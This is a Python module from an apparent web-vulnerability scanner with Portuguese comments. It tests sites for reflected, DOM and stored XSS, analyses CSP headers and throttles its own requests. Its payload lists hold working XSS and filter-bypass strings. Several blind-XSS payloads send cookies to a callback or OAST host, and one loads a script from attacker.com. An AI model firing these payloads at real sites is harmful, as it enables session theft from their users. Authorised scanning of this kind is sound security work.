# -*- coding: utf-8 -*-
"""
XSS Scanner Module
Módulo para detecção de vulnerabilidades de Cross-Site Scripting (XSS).
"""

import requests
import re
import time
import json
import base64
import urllib.parse
from urllib.parse import urljoin, urlparse, urlunparse, parse_qs
from bs4 import BeautifulSoup
from rich.table import Table
import threading
import queue
import concurrent.futures
from functools import partial
import asyncio

try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False
    websockets = None

# Import opcional do Selenium
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

from ..core import console, print_info, print_success, print_error, print_warning
from ..core.console import create_progress
from ..core.logger import get_logger
from ..utils.network import create_session

# Import metadata for help system
try:
    from .xss_scanner_metadata import METADATA
except ImportError:
    METADATA = None

# Register module with help system
if METADATA:
    try:
        from ..core.help_system import register_module
        register_module(METADATA)
    except ImportError:
        pass


class XSSScanner:
    """Scanner avançado para detecção de vulnerabilidades XSS."""

    def __init__(self, base_url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False, blind_xss_callback=None):
        self.base_url = base_url
        self.session = create_session()
        self.vulnerable_points = []
        self.payloads = self._load_payloads(custom_payloads_file)
        self.scan_stored = scan_stored
        self.fuzz_dom = fuzz_dom
        self.blind_xss_callback = blind_xss_callback  # URL para receber callbacks de blind XSS
        
        # Configurações avançadas inspiradas no DALFOX
        self.enable_bypasses = True
        self.context_analysis = True
        self.validate_execution = True
        self.analyze_csp = True
        self.verbose = False
        self.dom_verification = True
        self.parameter_mining = True
        self.bav_testing = True  # Blind Advanced Verification
        self.rate_limit_detection = True
        self.waf_fingerprint = True
        self.encoding_variations = True
        self.show_immediate_findings = False  # Controla se mostra achados durante o progresso
        self.test_headers = True  # Testa XSS em headers HTTP
        self.test_file_upload = True  # Testa XSS via file upload
        self.parallel_testing = True  # Ativa testes paralelos
        self.max_workers = 5  # Número máximo de threads paralelas
        # Thread safety locks
        self.results_lock = threading.Lock()  # Lock para thread safety
        self.stats_lock = threading.Lock()  # Lock para estatísticas
        self.cache_lock = threading.Lock()  # Lock para cache
        
        # Sistema de cache para evitar testes duplicados com TTL
        self.tested_parameters = {}  # Cache de parâmetros já testados com timestamp
        self.false_positive_cache = set()  # Cache de falsos positivos conhecidos
        self.cache_ttl = 3600  # TTL de 1 hora para cache
        
        # Estatísticas de scan (thread-safe)
        self.stats = {
            'total_requests': 0,
            'reflected_params': 0,
            'dom_sinks': 0,
            'stored_vulns': 0,
            'bypasses_found': 0,
            'waf_detected': False,
            'scan_start_time': time.time(),
            'vulnerabilities_found': 0,  # Contador de vulnerabilidades para exibição limpa
            'last_vuln_count': 0,  # Para detectar mudanças
            'error_rate': 0.0,  # Taxa de erro para rate limiting adaptativo
            'last_error_check': time.time()
        }
        
        # Rate limiting adaptativo
        self.current_delay = 0.1  # Delay inicial
        self.min_delay = 0.05
        self.max_delay = 5.0
        self.error_threshold = 0.3  # 30% de erro para aumentar delay
        
        # Driver Selenium (será inicializado quando necessário)
        self.driver = None
        self.headless_mode = True
        self._selenium_initialized = False

        # OAST client para blind XSS out-of-band
        self._oast_client = None

        self.logger = get_logger(__name__)

    def set_oast_client(self, oast_client) -> None:
        """Configura cliente OAST para detecção de Blind XSS via callbacks DNS/HTTP.

        Args:
            oast_client: Instância de OASTClient (spectra.utils.oast).
        """
        self._oast_client = oast_client
        oast_host = oast_client.generate_host("bxss")
        # Substitui placeholder CALLBACK_URL nos payloads blind_xss com URL OAST real
        blind_payloads = self._get_default_payloads().get('blind_xss', [])
        oast_payloads = [
            p.replace('CALLBACK_URL', f'https://{oast_host}/bxss')
            for p in blind_payloads
        ]
        # Adiciona fetch-based OAST payload que não depende de img
        oast_payloads.append(
            f"<script>fetch('https://{oast_host}/bxss?d='+document.domain+'&c='+encodeURIComponent(document.cookie))</script>"
        )
        # Substitui categoria blind_xss nos payloads carregados
        if isinstance(self.payloads, dict):
            self.payloads['blind_xss'] = oast_payloads
        self.logger.info(f"OAST blind XSS configurado: {oast_host}")

    def _load_payloads(self, custom_payloads_file):
        """Carrega payloads de um ficheiro ou usa payloads padrão."""
        default_payloads = self._get_default_payloads()
        
        if custom_payloads_file:
            try:
                # Validar se o caminho é seguro
                import os
                if not os.path.isfile(custom_payloads_file):
                    print_error(f"O ficheiro de payloads '{custom_payloads_file}' não foi encontrado. Usando payloads padrão.")
                    return default_payloads
                
                # Verificar tamanho do arquivo (limite de 10MB)
                if os.path.getsize(custom_payloads_file) > 10 * 1024 * 1024:
                    print_error(f"O ficheiro de payloads '{custom_payloads_file}' é muito grande (>10MB). Usando payloads padrão.")
                    return default_payloads
                
                with open(custom_payloads_file, 'r', encoding='utf-8', errors='ignore') as f:
                    custom_list = []
                    line_count = 0
                    for line in f:
                        line_count += 1
                        if line_count > 10000:  # Limite de 10000 linhas
                            print_warning(f"Ficheiro de payloads truncado em 10000 linhas por segurança.")
                            break
                        
                        line = line.strip()
                        if line and len(line) <= 1000:  # Limite de 1000 chars por payload
                            custom_list.append(line)
                    
                    if not custom_list:
                        print_warning(f"O ficheiro de payloads '{custom_payloads_file}' está vazio ou não contém payloads válidos. Usando payloads padrão.")
                        return default_payloads
                    
                    print_info(f"Carregados [bold cyan]{len(custom_list)}[/bold cyan] payloads customizados de '{custom_payloads_file}'.")
                    
                    # Adiciona payloads customizados à categoria 'custom'
                    default_payloads['custom'] = custom_list
                    return default_payloads
                    
            except (FileNotFoundError, PermissionError, OSError) as e:
                print_error(f"Erro ao carregar ficheiro de payloads '{custom_payloads_file}': {e}. Usando payloads padrão.")
                return default_payloads
            except Exception as e:
                self.logger.error(f"Erro inesperado ao carregar payloads: {e}")
                print_error(f"Erro inesperado ao carregar payloads. Usando payloads padrão.")
                return default_payloads
        
        # Converte dict para lista plana para compatibilidade com código existente
        all_payloads = []
        for category, payloads in default_payloads.items():
            all_payloads.extend(payloads)
        
        return all_payloads
    
    def _get_default_payloads(self):
        """Retorna payloads de XSS avançados inspirados no DALFOX."""
        return {
            # Payloads básicos para detecção rápida
            'basic': [
                "<script>alert('xss-test-spectra')</script>",
                "<img src=x onerror=alert('xss-test-spectra')>",
                "<svg onload=alert('xss-test-spectra')>",
                "<iframe src=javascript:alert('xss-test-spectra')>",
                "<body onload=alert('xss-test-spectra')>",
            ],
            
            # Payloads para DOM XSS
            'dom': [
                "'-alert('dom-xss-spectra')-'",
                "\"-alert('dom-xss-spectra')-\"",
                "javascript:alert('dom-xss-spectra')",
                "';alert('dom-xss-spectra');//",
                "\";alert('dom-xss-spectra');//",
                "</script><script>alert('dom-xss-spectra')</script>",
                "/**/alert('dom-xss-spectra')/**/",
                "eval(alert('dom-xss-spectra'))",
                "setTimeout(alert('dom-xss-spectra'),1)",
                "document.write('<script>alert(\"dom-xss-spectra\")</script>')"
            ],
            
            # Payloads para bypass de WAF
            'waf_bypass': [
                "<ScRiPt>alert('bypass-spectra')</ScRiPt>",
                "<SCRIPT>alert('bypass-spectra')</SCRIPT>",
                "<script\x0aalert('bypass-spectra')</script>",
                "<script\x0dalert('bypass-spectra')</script>",
                "<script\x09alert('bypass-spectra')</script>",
                "<script\x0calert('bypass-spectra')</script>",
                "<svg/onload=alert('bypass-spectra')>",
                "<img/src=x/onerror=alert('bypass-spectra')>",
                "<iframe//src=javascript:alert('bypass-spectra')>",
                "<<SCRIPT>alert('bypass-spectra')//<</SCRIPT>",
            ],
            
            # Payloads para contextos específicos
            'attribute': [
                "' onmouseover=alert('attr-spectra') '",
                "\" onmouseover=alert('attr-spectra') \"",
                "' onfocus=alert('attr-spectra') autofocus '",
                "\" onfocus=alert('attr-spectra') autofocus \"",
                "' onclick=alert('attr-spectra') '",
                "\" onclick=alert('attr-spectra') \"",
                "' onload=alert('attr-spectra') '",
                "\" onload=alert('attr-spectra') \"",
            ],
            
            # Payloads com encoding
            'encoded': [
                "%3Cscript%3Ealert('encoded-spectra')%3C/script%3E",
                "&#60;script&#62;alert('encoded-spectra')&#60;/script&#62;",
                "&lt;script&gt;alert('encoded-spectra')&lt;/script&gt;",
                "%253Cscript%253Ealert('double-encoded-spectra')%253C%252Fscript%253E",
                "\\u003cscript\\u003ealert('unicode-spectra')\\u003c/script\\u003e",
                "\\x3cscript\\x3ealert('hex-spectra')\\x3c/script\\x3e",
            ],
            
            # Polyglot payloads avançados
            'polyglot': [
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('polyglot-spectra')//'>",
                "\"'><img src=x onerror=alert('polyglot-spectra')>",
                "';alert('polyglot-spectra');//'><script>alert('polyglot-spectra')</script>",
                "\"><svg/onload=alert('polyglot-spectra')>",
                "*/alert('polyglot-spectra')/*",
                "'-alert('polyglot-spectra')-'",
                "\"-alert('polyglot-spectra')-\"",
            ],
            
            # Payloads para CSP bypass
            'csp_bypass': [
                "<script nonce>alert('csp-bypass-spectra')</script>",
                "<script src=data:,alert('csp-bypass-spectra')>",
                "<script src=//attacker.com/xss.js></script>",
                "<link rel=stylesheet href=data:,*{xss:expression(alert('csp-bypass-spectra'))}>",
                "<script>eval(location.hash.slice(1))</script>#alert('csp-bypass-spectra')",
                "<iframe src=javascript:parent.alert('csp-bypass-spectra')>",
            ],
            
            # Payloads para Blind XSS
            'blind_xss': [
                "<script>var i=new Image();i.src='CALLBACK_URL?blind_xss='+document.domain+'&cookie='+document.cookie;</script>",
                "<img src=x onerror='var i=new Image();i.src=\"CALLBACK_URL?blind_xss=\"+document.domain+\"&cookie=\"+document.cookie;'>",
                "<svg onload='var i=new Image();i.src=\"CALLBACK_URL?blind_xss=\"+document.domain+\"&cookie=\"+document.cookie;'>",
                "<iframe src='javascript:var i=new Image();i.src=\"CALLBACK_URL?blind_xss=\"+document.domain+\"&cookie=\"+document.cookie;'></iframe>",
                "<script>fetch('CALLBACK_URL?blind_xss='+document.domain+'&cookie='+document.cookie)</script>",
                "<script>navigator.sendBeacon('CALLBACK_URL','blind_xss='+document.domain+'&cookie='+document.cookie)</script>",
                "<script>document.location='CALLBACK_URL?blind_xss='+document.domain+'&cookie='+document.cookie</script>",
                "<script>var x=new XMLHttpRequest();x.open('GET','CALLBACK_URL?blind_xss='+document.domain+'&cookie='+document.cookie);x.send()</script>",
            ],
            
            # Payloads para HTTP Headers
            'header_xss': [
                "<script>alert('header-xss-spectra')</script>",
                "\"'><script>alert('header-xss-spectra')</script>",
                "<img src=x onerror=alert('header-xss-spectra')>",
                "<svg onload=alert('header-xss-spectra')>",
                "javascript:alert('header-xss-spectra')",
                "';alert('header-xss-spectra');//",
                "\";alert('header-xss-spectra');//",
                "</script><script>alert('header-xss-spectra')</script>",
            ],

            # Mutation XSS (mXSS) — exploits browser HTML parser quirks
            'mxss': [
                # Serialization/deserialization parser differentials
                "<listing><img src='</listing><img src=x onerror=alert(1)>'>",
                "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
                "<!--[if]><script>alert(1)</script-->",
                "<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
                # SVG CDATA differential
                "<svg><![CDATA[><image xlink:href=']]><img/xlink:href=y onerror=alert(1)/>'>",
                # innerHTML re-parsing
                "<p id='</p><img/src/onerror=alert(1)//'>",
                # Template literal escape
                "<script>var x=`${alert(1)}`</script>",
                # Object.prototype pollution via innerHTML
                "<svg><animate attributeName=href values=javascript:alert(1) /><a id=a><animate attributeName=href values=javascript:alert(1) /></a></svg>",
            ],

            # DOM Clobbering — overwrites browser globals via HTML id/name attributes
            'dom_clobbering': [
                # Clobber window.xss
                "<img name=xss id=xss src=x onerror=alert(1)>",
                # Clobber document.cookie
                "<form id=cookie><input id=length value=1></form>",
                # Clobber document.forms[0].action  
                "<form id=login action=javascript:alert(1)>",
                # Anchor + form clobbering
                "<a id=spectra-test href=javascript:alert(1)></a>",
                # Named anchor to clobber location
                "<a name=location href=javascript:alert(1)></a>",
            ],
        }

    def _detect_context(self, response_text, payload):
        """Detecta o contexto onde o payload foi refletido com análise avançada."""
        contexts = []
        escaped_payload = re.escape(payload)
        
        # Verifica se está em um script tag
        script_patterns = [
            rf'<script[^>]*>.*?{escaped_payload}.*?</script>',
            rf'<script[^>]*{escaped_payload}[^>]*>',
        ]
        for pattern in script_patterns:
            if re.search(pattern, response_text, re.DOTALL | re.IGNORECASE):
                contexts.append('script')
                break
        
        # Verifica se está em um atributo HTML
        attr_patterns = [
            rf'[a-zA-Z-]+\s*=\s*[\'"][^\'\"]*{escaped_payload}[^\'\"]*[\'"]',
            rf'[a-zA-Z-]+\s*=\s*{escaped_payload}(?:\s|>)',
        ]
        for pattern in attr_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                contexts.append('attribute')
                break
        
        # Verifica se está em um event handler
        event_handlers = [
            'onclick', 'onload', 'onmouseover', 'onfocus', 'onblur', 'onchange',
            'onsubmit', 'onkeydown', 'onkeyup', 'onkeypress', 'onerror'
        ]
        for handler in event_handlers:
            pattern = rf'{handler}\s*=\s*[\'"][^\'\"]*{escaped_payload}[^\'\"]*[\'"]'
            if re.search(pattern, response_text, re.IGNORECASE):
                contexts.append('event_handler')
                break
        
        # Verifica se está em CSS
        css_patterns = [
            rf'<style[^>]*>.*?{escaped_payload}.*?</style>',
            rf'style\s*=\s*[\'"][^\'\"]*{escaped_payload}[^\'\"]*[\'"]',
        ]
        for pattern in css_patterns:
            if re.search(pattern, response_text, re.DOTALL | re.IGNORECASE):
                contexts.append('css')
                break
        
        # Verifica se está em URL (href, src, etc.)
        url_attrs = ['href', 'src', 'action', 'formaction', 'data', 'poster']
        for attr in url_attrs:
            pattern = rf'{attr}\s*=\s*[\'"][^\'\"]*{escaped_payload}[^\'\"]*[\'"]'
            if re.search(pattern, response_text, re.IGNORECASE):
                contexts.append('url')
                break
        
        # Verifica se está em comentário HTML
        comment_pattern = rf'<!--.*?{escaped_payload}.*?-->'
        if re.search(comment_pattern, response_text, re.DOTALL | re.IGNORECASE):
            contexts.append('html_comment')
        
        # Verifica se está em JSON
        json_pattern = rf'[\'\"]{escaped_payload}[\'\"]\s*:\s*|:\s*[\'\"]{escaped_payload}[\'"]'
        if re.search(json_pattern, response_text, re.IGNORECASE):
            contexts.append('json')
        
        # Verifica se está em texto HTML normal
        if payload in response_text and not contexts:
            contexts.append('html_text')
        
        return contexts

    def _analyze_csp(self, response):
        """Analisa Content Security Policy com detalhes avançados e técnicas de bypass."""
        csp_header = response.headers.get('Content-Security-Policy', '')
        csp_report_only = response.headers.get('Content-Security-Policy-Report-Only', '')
        
        if not csp_header and not csp_report_only:
            return {'present': False, 'allows_inline_script': True}
        
        # Usa CSP principal ou report-only
        active_csp = csp_header if csp_header else csp_report_only
        is_report_only = bool(csp_report_only and not csp_header)
        
        # Analisa diretivas específicas
        csp_analysis = {
            'present': True,
            'header': active_csp,
            'report_only': is_report_only,
            'directives': {},
            'bypasses': [],
            'risk_level': 'Low',
            'allows_inline_script': False,
            'bypass_techniques': []
        }
        
        # Extrai diretivas
        directives = {}
        for directive in active_csp.split(';'):
            if ':' in directive:
                key, value = directive.strip().split(':', 1)
                directives[key.strip()] = value.strip()
        
        csp_analysis['directives'] = directives
        
        # Analisa script-src
        script_src = directives.get('script-src', directives.get('default-src', ''))
        if script_src:
            if "'unsafe-inline'" in script_src:
                csp_analysis['bypasses'].append("'unsafe-inline' permite scripts inline")
                csp_analysis['allows_inline_script'] = True
                csp_analysis['risk_level'] = 'High'
                csp_analysis['bypass_techniques'].append("Usar <script>alert(1)</script>")
                
            if "'unsafe-eval'" in script_src:
                csp_analysis['bypasses'].append("'unsafe-eval' permite eval()")
                csp_analysis['risk_level'] = 'High'
                csp_analysis['bypass_techniques'].append("Usar eval() ou Function() constructor")
                
            if 'data:' in script_src:
                csp_analysis['bypasses'].append("data: URIs permitidos")
                csp_analysis['risk_level'] = 'Medium'
                csp_analysis['bypass_techniques'].append("Usar <script src=data:text/javascript,alert(1)>")
                
            if '*' in script_src:
                csp_analysis['bypasses'].append("Wildcard (*) permite qualquer origem")
                csp_analysis['risk_level'] = 'High'
                csp_analysis['bypass_techniques'].append("Hospedar script malicioso em qualquer domínio")
                
            if 'http:' in script_src:
                csp_analysis['bypasses'].append("HTTP permitido (inseguro)")
                csp_analysis['risk_level'] = 'Medium'
                csp_analysis['bypass_techniques'].append("MITM para injetar scripts via HTTP")
                
            # Verifica domínios específicos vulneráveis
            vulnerable_domains = [
                'googleapis.com', 'google.com', 'gstatic.com', 'jsdelivr.net',
                'unpkg.com', 'cdnjs.cloudflare.com', 'ajax.googleapis.com'
            ]
            for domain in vulnerable_domains:
                if domain in script_src:
                    csp_analysis['bypasses'].append(f"Domínio vulnerável permitido: {domain}")
                    if csp_analysis['risk_level'] == 'Low':
                        csp_analysis['risk_level'] = 'Medium'
                    csp_analysis['bypass_techniques'].append(f"Usar JSONP callback ou vulnerabilidade em {domain}")
                    
            # Verifica nonces mal implementados
            if 'nonce-' in script_src:
                csp_analysis['bypasses'].append("Nonce detectado - verificar reutilização")
                csp_analysis['bypass_techniques'].append("Reutilizar nonce ou injetar em contexto com nonce")
                
        else:
            csp_analysis['bypasses'].append("Nenhuma restrição script-src")
            csp_analysis['allows_inline_script'] = True
            csp_analysis['risk_level'] = 'High'
        
        # Verifica object-src
        object_src = directives.get('object-src', '')
        if object_src != "'none'":
            csp_analysis['bypasses'].append("object-src não restrito adequadamente")
            csp_analysis['bypass_techniques'].append("Usar <object> ou <embed> para bypass")
            if csp_analysis['risk_level'] == 'Low':
                csp_analysis['risk_level'] = 'Medium'
        
        # Verifica base-uri
        base_uri = directives.get('base-uri', '')
        if not base_uri or base_uri != "'self'":
            csp_analysis['bypasses'].append("base-uri não restrito")
            csp_analysis['bypass_techniques'].append("Injetar <base> tag para redirecionamento")
            if csp_analysis['risk_level'] == 'Low':
                csp_analysis['risk_level'] = 'Medium'
                
        # Verifica frame-ancestors
        frame_ancestors = directives.get('frame-ancestors', '')
        if not frame_ancestors:
            csp_analysis['bypasses'].append("frame-ancestors não definido (permite clickjacking)")
            
        # Verifica form-action
        form_action = directives.get('form-action', '')
        if not form_action:
            csp_analysis['bypasses'].append("form-action não restrito")
            
        # Verifica connect-src para WebSocket bypass
        connect_src = directives.get('connect-src', '')
        if not connect_src or '*' in connect_src:
            csp_analysis['bypasses'].append("connect-src permite conexões externas")
            csp_analysis['bypass_techniques'].append("Usar WebSocket ou XMLHttpRequest para exfiltração")
            
        # Verifica worker-src para Web Workers
        worker_src = directives.get('worker-src', directives.get('script-src', ''))
        if 'data:' in worker_src or '*' in worker_src:
            csp_analysis['bypasses'].append("worker-src permite Web Workers externos")
            csp_analysis['bypass_techniques'].append("Usar Web Workers para bypass")
            
        # Verifica style-src para CSS injection
        style_src = directives.get('style-src', directives.get('default-src', ''))
        if "'unsafe-inline'" in style_src:
            csp_analysis['bypasses'].append("'unsafe-inline' em style-src permite CSS injection")
            csp_analysis['bypass_techniques'].append("CSS injection com expression() ou data URIs")
        
        return csp_analysis

    def _is_false_positive(self, payload, response_text, url):
        """Verifica se a detecção é um falso positivo."""
        # Cria chave única para cache
        cache_key = f"{url}:{payload[:50]}"
        
        if cache_key in self.false_positive_cache:
            return True
        
        # Verifica padrões de falsos positivos comuns
        false_positive_patterns = [
            # Payload refletido em comentários HTML
            rf'<!--.*?{re.escape(payload)}.*?-->',
            # Payload refletido em scripts de erro/debug
            rf'error.*?{re.escape(payload)}.*?stack',
            rf'debug.*?{re.escape(payload)}.*?trace',
            # Payload refletido em JSON sem execução
            rf'".*?{re.escape(payload)}.*?":\s*"',
            # Payload refletido em atributos de data
            rf'data-.*?=.*?{re.escape(payload)}',
            # Payload refletido em URLs sem contexto de execução
            rf'href.*?=.*?{re.escape(payload)}.*?rel=',
            # Payload refletido em inputs hidden/disabled
            rf'<input[^>]*disabled[^>]*value.*?{re.escape(payload)}',
            rf'<input[^>]*type=["\']*hidden[^>]*value.*?{re.escape(payload)}',
        ]
        
        for pattern in false_positive_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                # Adiciona ao cache de falsos positivos
                self.false_positive_cache.add(cache_key)
                return True
        
        # Verifica se payload está em contexto não executável
        non_executable_contexts = [
            'title', 'meta', 'link', 'noscript', 'noframes'
        ]
        
        for context in non_executable_contexts:
            pattern = rf'<{context}[^>]*>.*?{re.escape(payload)}.*?</{context}>'
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                self.false_positive_cache.add(cache_key)
                return True
        
        return False

    def _is_parameter_already_tested(self, method, url, param):
        """Verifica se o parâmetro já foi testado."""
        test_key = f"{method.upper()}:{url}:{param}"
        
        if test_key in self.tested_parameters:
            return True
        
        # Adiciona ao cache
        self.tested_parameters.add(test_key)
        return False

    def _validate_xss_execution(self, payload, response_text):
        """Valida se o XSS realmente pode ser executado."""
        validation_score = 0
        
        # Verifica se está em contexto executável
        executable_contexts = [
            r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
            r'on\w+\s*=\s*[\'"][^\'\"]*' + re.escape(payload),
            r'href\s*=\s*[\'"]javascript:.*?' + re.escape(payload),
            r'src\s*=\s*[\'"]javascript:.*?' + re.escape(payload),
        ]
        
        for context in executable_contexts:
            if re.search(context, response_text, re.IGNORECASE):
                validation_score += 3
                
        # Verifica se está em HTML text (potencialmente executável)
        if re.search(rf'>[^<]*{re.escape(payload)}[^<]*<', response_text):
            validation_score += 2
            
        # Verifica se está em atributo (moderadamente executável)
        if re.search(rf'\w+\s*=\s*[\'"][^\'\"]*{re.escape(payload)}', response_text):
            validation_score += 1
            
        # Verifica encodings que podem impedir execução
        if any(enc in payload for enc in ['&lt;', '&gt;', '&quot;', '&#']):
            validation_score -= 2
            
        return validation_score >= 2
    
    def _update_stats_thread_safe(self, key, increment=1):
        """Atualiza estatísticas de forma thread-safe."""
        with self.stats_lock:
            if key in self.stats:
                if isinstance(self.stats[key], (int, float)):
                    self.stats[key] += increment
                else:
                    self.stats[key] = increment
    
    def _update_error_rate(self, is_error=False):
        """Atualiza taxa de erro para rate limiting adaptativo."""
        with self.stats_lock:
            current_time = time.time()
            
            # Calcula janela de tempo de 60 segundos
            if current_time - self.stats['last_error_check'] >= 60:
                self.stats['error_rate'] = 0.0
                self.stats['last_error_check'] = current_time
            
            if is_error:
                self.stats['error_rate'] = min(1.0, self.stats['error_rate'] + 0.1)
            else:
                self.stats['error_rate'] = max(0.0, self.stats['error_rate'] - 0.05)
    
    def _adaptive_delay(self, waf_detected=False):
        """Calcula delay adaptativo baseado na taxa de erro e detecção de WAF."""
        with self.stats_lock:
            error_rate = self.stats['error_rate']
        
        # Base delay baseado em WAF
        if waf_detected:
            base_delay = 1.0
        else:
            base_delay = 0.1
        
        # Ajusta baseado na taxa de erro
        if error_rate > self.error_threshold:
            # Aumenta delay exponencialmente
            self.current_delay = min(self.max_delay, self.current_delay * 1.5)
        elif error_rate < 0.1:
            # Diminui delay gradualmente
            self.current_delay = max(self.min_delay, self.current_delay * 0.9)
        
        return max(base_delay, self.current_delay)

    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona ou atualiza uma descoberta, priorizando XSS Armazenado. Thread-safe."""
        with self.results_lock:
            is_new_finding = True
            
            # Verifica se uma descoberta para este 'detalhe' já existe
            for i, finding in enumerate(self.vulnerable_points):
                if finding["Detalhe"] == detail:
                    is_new_finding = False
                    # Se a nova descoberta for "Armazenado" e a existente não for, atualiza-a.
                    if v_type == "XSS Armazenado" and finding["Tipo"] != "XSS Armazenado":
                        self.vulnerable_points[i].update({
                            "Risco": "Alto",
                            "Tipo": "XSS Armazenado",
                            "Recomendação": recommendation
                        })
                        # Notificação verbose para upgrade de vulnerabilidade
                        if self.verbose:
                            print_warning(f"Vulnerabilidade atualizada para [bold red]XSS Armazenado[/bold red]: [cyan]{detail.split(' em ')[0] if ' em ' in detail else detail[:50]}[/cyan]")
                    return  # Evita adicionar uma duplicada

            # Se não houver correspondência, adiciona a nova descoberta
            if is_new_finding:
                self.vulnerable_points.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})
                self.stats['vulnerabilities_found'] = len(self.vulnerable_points)
                
                # Notificação verbose para nova vulnerabilidade
                if self.verbose:
                    param_name = detail.split("'")[1] if "'" in detail else detail.split(' em ')[0] if ' em ' in detail else detail[:50]
                    risk_color = 'red' if risk == 'Alto' else 'yellow' if risk == 'Médio' else 'cyan'
                    type_color = 'red' if 'Armazenado' in v_type else 'yellow' if 'DOM' in v_type else 'green'
                    print_success(f"[{risk_color}]{risk}[/{risk_color}] - [{type_color}]{v_type}[/{type_color}] em [cyan]{param_name}[/cyan]")
    
    def _update_progress_with_vulns(self, progress, task_id, param_name):
        """Atualiza a descrição da barra de progresso com o número de vulnerabilidades encontradas de forma discreta."""
        vuln_count = len(self.vulnerable_points)
        if vuln_count > 0:
            vuln_text = f"[green]Testando [cyan]{param_name}[/cyan] | [red]{vuln_count} vuln(s)[/red]"
        else:
            vuln_text = f"[green]Testando [cyan]{param_name}[/cyan]"
        
        progress.update(task_id, description=vuln_text)

    def _test_parameter_parallel(self, method, url, param, form_data, waf_info, payloads):
        """Testa um parâmetro específico de forma thread-safe."""
        results = []
        
        # Primeiro, testa com payload de análise de contexto
        test_payload = "xss-context-test-spectra-12345"
        test_data = {param: test_payload}
        
        try:
            if method.lower() == 'get':
                response = self.session.get(url, params=test_data, timeout=7, verify=True)
            else:
                post_payload = (form_data or {}).copy()
                post_payload[param] = test_payload
                response = self.session.post(url, data=post_payload, timeout=7, verify=True)
            
            self._update_stats_thread_safe('total_requests', 1)
            self._update_error_rate(False)  # Sucesso na requisição
            
            if test_payload in response.text:
                self._update_stats_thread_safe('reflected_params', 1)
                
                # Análise de contexto
                contexts = self._detect_context(response.text, test_payload)
                csp_info = self._analyze_csp(response)
                
                # Seleciona payloads baseados no contexto
                selected_payloads = payloads[:8]  # Limite para paralelização
                if 'attribute' in contexts:
                    selected_payloads.extend(self._get_default_payloads()['attribute'][:2])
                if waf_info.get('detected'):
                    selected_payloads.extend(self._get_default_payloads()['waf_bypass'][:2])
                
                # Testa payloads selecionados
                for payload in selected_payloads:
                    variant_test_data = {param: payload}
                    
                    try:
                        if method.lower() == 'get':
                            variant_response = self.session.get(url, params=variant_test_data, timeout=7, verify=True)
                        else:
                            post_variant = (form_data or {}).copy()
                            post_variant[param] = payload
                            variant_response = self.session.post(url, data=post_variant, timeout=7, verify=True)
                        
                        self._update_stats_thread_safe('total_requests', 1)
                        self._update_error_rate(False)
                        
                        if payload in variant_response.text:
                            # Verifica se é falso positivo
                            if self._is_false_positive(payload, variant_response.text, url):
                                continue
                            
                            # Valida se XSS pode realmente ser executado
                            if not self._validate_xss_execution(payload, variant_response.text):
                                continue
                            
                            # Calcula risco
                            risk_score = 0
                            if 'script' in contexts or 'event_handler' in contexts:
                                risk_score += 3
                            elif 'html_text' in contexts:
                                risk_score += 2
                            elif 'attribute' in contexts:
                                risk_score += 1
                            
                            if not csp_info.get('present'):
                                risk_score += 2
                            elif csp_info.get('report_only'):
                                risk_score += 1
                            
                            risk = "Alto" if risk_score >= 5 else "Médio" if risk_score >= 3 else "Baixo"
                            
                            detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                            context_str = ', '.join(contexts) if contexts else 'Desconhecido'
                            rec = f"Payload '{payload}' refletido no contexto: {context_str}. Validação de execução confirmada."
                            
                            results.append({
                                'risk': risk,
                                'type': 'XSS Refletido',
                                'detail': detail,
                                'recommendation': rec
                            })
                            break
                            
                    except requests.RequestException:
                        continue
                        
        except requests.RequestException as e:
            self._update_error_rate(True)
            self.logger.debug(f"Erro na requisição principal: {e}")
        except Exception as e:
            self._update_error_rate(True)
            self.logger.error(f"Erro inesperado no teste de parâmetro: {e}")
            
        return results

    def _scan_reflected_parallel(self, tasks, progress, waf_info):
        """Executa o scan de XSS Refletido usando processamento paralelo."""
        if not self.parallel_testing or len(tasks) < 3:
            # Para poucos parâmetros, usa método sequencial
            return self._scan_reflected_advanced(tasks, progress, waf_info)
            
        task_id = progress.add_task("[green]Scan XSS Refletido Paralelo...", total=len(tasks))
        
        # Seleciona payloads base
        all_payloads_dict = self._get_default_payloads()
        base_payloads = []
        base_payloads.extend(all_payloads_dict['basic'][:3])
        base_payloads.extend(all_payloads_dict['polyglot'][:2])
        
        # Cria função parcial para facilitar o uso com ThreadPoolExecutor
        test_func = partial(
            self._test_parameter_parallel,
            waf_info=waf_info,
            payloads=base_payloads
        )
        
        # Executa testes em paralelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submete tarefas
            future_to_task = {}
            for method, url, param, form_data in tasks:
                future = executor.submit(test_func, method, url, param, form_data)
                future_to_task[future] = (method, url, param, form_data)
            
            # Coleta resultados conforme completam
            for future in concurrent.futures.as_completed(future_to_task):
                method, url, param, form_data = future_to_task[future]
                
                try:
                    results = future.result(timeout=30)  # Timeout de 30s por parâmetro
                    
                    # Adiciona findings encontrados
                    for result in results:
                        self._add_finding(
                            result['risk'],
                            result['type'], 
                            result['detail'],
                            result['recommendation']
                        )
                        
                except (concurrent.futures.TimeoutError, Exception) as e:
                    if self.verbose:
                        print_warning(f"Erro testando parâmetro [cyan]{param}[/cyan]: {str(e)[:50]}")
                
                # Atualiza progresso
                progress.update(task_id, advance=1)
                
        progress.remove_task(task_id)

    def _scan_reflected(self, tasks, progress):
        """Executa o scan para XSS Refletido."""
